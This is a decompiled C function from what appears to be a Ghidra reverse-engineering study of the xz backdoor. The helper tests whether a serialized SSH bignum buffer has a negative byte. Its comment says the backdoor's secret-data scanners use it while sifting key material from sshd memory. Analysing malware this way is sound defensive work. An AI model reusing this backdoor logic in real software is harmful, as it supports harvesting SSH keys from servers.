// /home/kali/xzre-ghidra/xzregh/107920_sshbuf_bignum_is_negative.c
// Function: sshbuf_bignum_is_negative @ 0x107920
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshbuf_bignum_is_negative(sshbuf * buf)


/*
 * AutoDoc: Checks whether a serialized BIGNUM is negative by inspecting its buffer layout. Secret-data scanners invoke it to ignore malformed key material pulled from sshd buffers.
 */

#include "xzre_types.h"

BOOL sshbuf_bignum_is_negative(sshbuf *buf)

{
  BOOL BVar1;
  size_t sVar2;
  
  BVar1 = FALSE;
  if (buf->size - 0x20 < 0x21) {
    sVar2 = 0;
    while (-1 < (char)buf->d[sVar2]) {
      sVar2 = sVar2 + 1;
      if (buf->size == sVar2) {
        return FALSE;
      }
    }
    BVar1 = TRUE;
  }
  return BVar1;
}

